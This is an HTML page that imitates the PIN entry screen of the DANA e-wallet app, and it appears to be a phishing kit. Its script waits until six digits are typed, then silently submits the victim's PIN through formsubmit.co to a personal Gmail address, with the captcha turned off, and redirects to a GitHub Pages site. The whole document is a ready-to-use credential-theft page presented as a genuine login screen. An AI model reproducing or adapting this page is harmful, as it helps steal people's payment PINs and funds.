<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan PIN</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #008CFF;
      color: white;
      text-align: center;
    }

    .header {
      background-color: #008CFF;
      color: white;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px;
      font-size: 18px;
      font-weight: bold;
    }

    .header .back {
      font-size: 24px;
      margin-right: 10px;
      cursor: pointer;
    }

    .title {
      margin-top: 40px;
      font-size: 16px;
    }

    .title strong {
      font-weight: bold;
    }

    .pin-boxes {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 30px 0 20px;
    }

    .pin-box {
      width: 48px;
      height: 48px;
      border-radius: 10px;
      background-color: white;
      color: black;
      font-size: 24px;
      text-align: center;
      line-height: 48px;
    }

    input[type="password"] {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }

    .show-btn {
      padding: 8px 20px;
      border: 1.5px solid white;
      background: transparent;
      color: white;
      font-weight: bold;
      border-radius: 20px;
      margin-bottom: 20px;
      cursor: pointer;
    }

    .links {
      font-size: 14px;
      margin-top: 10px;
    }

    .links a {
      color: white;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body onclick="document.getElementById('pinInput').focus()">

  <div class="header">
    <div class="back">&larr;</div>
    <div>Masuk</div>
    <div style="width: 24px;"></div> <!-- Spacer -->
  </div>

  <div class="title">Masukkan <strong>PIN DANA</strong></div>

  <div class="pin-boxes" id="pinDots">
    <div class="pin-box" id="dot1"></div>
    <div class="pin-box" id="dot2"></div>
    <div class="pin-box" id="dot3"></div>
    <div class="pin-box" id="dot4"></div>
    <div class="pin-box" id="dot5"></div>
    <div class="pin-box" id="dot6"></div>
  </div>

  <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
    <input type="password" id="pinInput" name="PIN" maxlength="6" inputmode="numeric" pattern="\d{6}" required />
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://b813743.github.io/Testing-/">
  </form>

  <button class="show-btn" onclick="togglePin()">TAMPILKAN</button>

  <div class="links">
    <a href="#">LUPA PIN?</a>
  </div>

  <script>
    const input = document.getElementById("pinInput");
    const boxes = [
      document.getElementById("dot1"),
      document.getElementById("dot2"),
      document.getElementById("dot3"),
      document.getElementById("dot4"),
      document.getElementById("dot5"),
      document.getElementById("dot6"),
    ];

    input.addEventListener("input", () => {
      const val = input.value;
      boxes.forEach((box, i) => {
        box.textContent = val[i] ? "•" : "";
      });

      if (val.length === 6) {
        input.form.submit();
      }
    });

    function togglePin() {
      boxes.forEach((box, i) => {
        const val = input.value[i];
        if (val) {
          box.textContent = box.textContent === "•" ? val : "•";
        }
      });
    }

    window.onload = () => {
      input.focus();
    };
  </script>
</body>
</html>
